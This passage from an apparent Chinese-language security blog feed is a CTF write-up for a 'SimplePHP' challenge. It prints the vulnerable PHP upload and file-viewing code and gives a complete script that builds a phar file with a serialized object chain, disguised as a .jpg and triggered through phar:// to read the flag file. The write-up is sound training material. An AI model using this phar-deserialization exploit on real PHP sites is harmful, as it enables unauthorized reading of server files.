class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123; <br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    &#125; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>仔细分析代码，发现只用这里能够读取到flag：</p><p>Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们仔细分析一下Test类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现有这样一条链：<code>__get($key)=&gt;get($key)=&gt;file_get($value)</code></p><p>我们可以通过调用 <code>__get($key)</code>方法，逐步传参，然后获得$value使用file_get_contents()函数取出flag。但是我们想要让 <code>$value=&quot;/var/www/html/f1ag.php&quot;</code></p><p>需要让变量 $params变为一个数组，我们先假设数组为：<code>$params=array(&#39;source&#39;=&gt;&#39;/var/www/html/f1ag.php&#39;)</code></p><p>但是我们如何才能调用 <code>__get()方法</code>呢，这是一个魔术方法，当我们访问通过该类对象调用一个不存在的属性时，就会自动调用该方法。</p><p>我们接下来观察一下Show类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们观察一下 <code>__toString()</code>方法，我们发现：</p><p><code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code></p><p>并且在方法<code>__construct()</code>中提示我们使用<code>phar://伪协议</code></p><p>所以，此处我们应该让 <code>$this-&gt;str[&#39;str&#39;]</code>设为Test对象，这样的话，Test对象就会调用一个不存在的属性：source，就会调用Test类魔术方法<code>__get()</code>，从而获得flag</p><p>但是怎样才能让Show对象调用<code>__toString()</code>方法？</p><p>我们观察一下C1e4r这个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们设置 $str变量为Show类对象，这样就可以调用Show类对象的<code>__toString()</code>方法了</p><p>通过以上分析，我们可以写如下代码构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;/var/www/html/f1ag.php&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$s</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$t</span>;<br><span class="hljs-variable">$c</span>-&gt;str=<span class="hljs-variable">$s</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;exp.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>生成phar文件：<code>exp.phar</code></p><p>根据文件上传检查函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123;<br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以将文件后缀改为: <code>jpg</code>进行绕过</p><p>上传之后会进行重命名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777);</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件名重新编码，通过<code>文件名+ip地址</code>进行md5编码，</p><p>我们可以访问 <code>/upload</code> 获取上传文件名：</p><p><img src="https://s2.loli.net/2023/03/23/VWgJOaCE2RvmAId.png" alt="image-20230323163624046"></p><p>我们观察一下：file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里我们注意到了 <code>file_exists()函数</code>，配合<code>phar://伪协议</code>和phar文件可以实现反序列化，然后输出 flag的base64编码</p><p>我们直接使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">phar:<span class="hljs-comment">//upload/文件名</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/23/qZ6nSL1z3mJMkVK.png" alt="image-20230323163930699"></p><p>解密获得flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SimplePHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE(命令执行)总结</title>
    <link href="/2023/08/24/RCE(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/24/RCE(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E6%80%BB%E7%BB%93/</url>
    
